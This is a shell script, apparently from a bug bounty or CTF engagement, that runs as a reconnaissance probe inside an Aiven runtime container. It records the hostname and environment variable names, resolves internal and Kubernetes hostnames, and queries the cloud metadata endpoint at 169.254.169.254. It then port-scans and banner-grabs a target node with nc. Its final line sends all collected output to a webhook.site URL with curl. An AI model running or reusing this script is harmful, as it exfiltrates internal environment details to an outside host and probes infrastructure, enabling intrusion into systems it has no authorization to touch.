#!/bin/sh
O=/www/index.txt
{
echo "=== aiven runtime container egress probe $(date -u) ==="
echo "--- identity ---"
echo "hostname: $(hostname)"
echo "env names: $(env | cut -d= -f1 | sort | tr '\n' ' ')"
echo "--- dns ---"
for n in falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com api.aiven.io metadata.google.internal kubernetes.default.svc; do
  printf "%s -> %s\n" "$n" "$(getent hosts $n 2>/dev/null | head -1)"
done
echo "--- internet control ---"
echo "ifconfig.me: $(curl -s -m 8 https://ifconfig.me/ 2>&1 | head -c 40)"
echo "api.aiven.io: HTTP $(curl -s -m 8 -o /dev/null -w '%{http_code}' https://api.aiven.io/ 2>&1)"
echo "--- cloud metadata ---"
echo "169.254.169.254 no-hdr: HTTP $(curl -s -m 5 -o /tmp/m1 -w '%{http_code}' http://169.254.169.254/computeMetadata/v1/ 2>&1) body=$(head -c 60 /tmp/m1 2>/dev/null)"
echo "169.254.169.254 gcp-hdr: HTTP $(curl -s -m 5 -H 'Metadata-Flavor: Google' -o /tmp/m2 -w '%{http_code}' http://169.254.169.254/computeMetadata/v1/ 2>&1) body=$(head -c 60 /tmp/m2 2>/dev/null)"
echo "--- TCP to CTF node 132.145.163.127 ---"
for p in 22 5432 443 80; do
  if timeout 8 nc -z -w 5 132.145.163.127 $p >/dev/null 2>&1; then echo "port $p: OPEN"; else echo "port $p: no response"; fi
done
echo "--- ssh banner (if any) ---"
timeout 6 nc -w 4 132.145.163.127 22 2>&1 | head -c 120
echo
echo "--- control 1.1.1.1:443 ---"
timeout 8 nc -z -w 5 1.1.1.1 443 >/dev/null 2>&1 && echo "control: OPEN (egress works)" || echo "control: FAILED"
echo "=== end ==="
} > $O 2>&1
curl -s -m 15 --data-binary @$O "https://webhook.site/75413855-3547-4aad-8cb2-a9aabff82225" >/dev/null 2>&1
